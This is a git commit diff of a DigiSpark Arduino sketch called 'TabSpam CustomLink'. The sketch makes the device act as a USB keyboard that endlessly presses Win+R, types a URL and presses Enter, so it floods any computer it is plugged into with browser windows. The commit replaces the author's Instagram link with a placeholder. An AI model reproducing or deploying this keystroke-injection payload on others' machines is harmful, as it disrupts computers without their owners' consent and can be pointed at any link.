7f49868e037bebd5d7ccf7b9820722bbe10e4529
KEANU_AER <71291795+keanuaer@users.noreply.github.com>
2022-02-17 20:54:11 +0100

    Update and rename TabSpam CustomLink.txt to TabSpam CustomLink.ino

--- TabSpam CustomLink.ino
+++ TabSpam CustomLink.ino
@@ -1,12 +1,15 @@
 #include "DigiKeyboard.h"
 void setup() {
 }
+
+//Loop Effect - Script will restart unlimited
+
 void loop() {
   DigiKeyboard.delay(100);
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
   DigiKeyboard.delay(100);
-  DigiKeyboard.print("https://www.instagram.com/keanu_aer");
+  DigiKeyboard.print("YOURLINKHEREEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(20);
 }
